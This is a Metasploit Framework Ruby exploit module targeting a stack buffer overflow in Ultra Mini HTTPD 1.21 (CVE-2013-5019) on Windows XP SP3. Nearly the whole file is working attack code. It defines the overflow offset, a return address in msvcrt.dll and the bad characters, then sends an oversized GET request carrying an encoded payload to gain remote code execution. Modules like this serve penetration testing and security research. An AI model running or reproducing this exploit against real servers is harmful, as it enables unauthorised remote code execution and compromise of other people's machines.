# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Ultra Mini HTTPD Stack Buffer Overflow",
      &#039;Description&#039;    => %q{
          This module exploits a stack based buffer overflow in Ultra Mini HTTPD 1.21
        allowing remote attackers to execute arbitrary code via a long resource name in an HTTP
        request.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;superkojiman&#039;,  #Discovery, PoC
          &#039;PsychoSpy <neinwechter[at]gmail.com>&#039; #Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;95164&#039;],
          [&#039;EDB&#039;,&#039;26739&#039;],
          [&#039;CVE&#039;,&#039;2013-5019&#039;],
          [&#039;BID&#039;,&#039;61130&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039; => 1623,
          &#039;StackAdjustment&#039; => -3500,
          &#039;BadChars&#039; => "\x00\x09\x0a\x0b\x0c\x0d\x20\x2f\x3f"
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "thread"
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [
            &#039;v1.21 - Windows XP SP3&#039;,
            {
              &#039;Offset&#039; => 5412,
              &#039;Ret&#039;=>0x77c354b4 # push esp / ret - msvcrt.dll
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Jul 10 2013&#039;,
      &#039;DefaultTarget&#039;  => 0
    ))
  end

  def exploit
    buf = rand_text(target[&#039;Offset&#039;])
    buf << [target.ret].pack("V*")
    buf << payload.encoded

    print_status("Sending buffer...")
    send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => "/#{buf}"
    })
  end
end

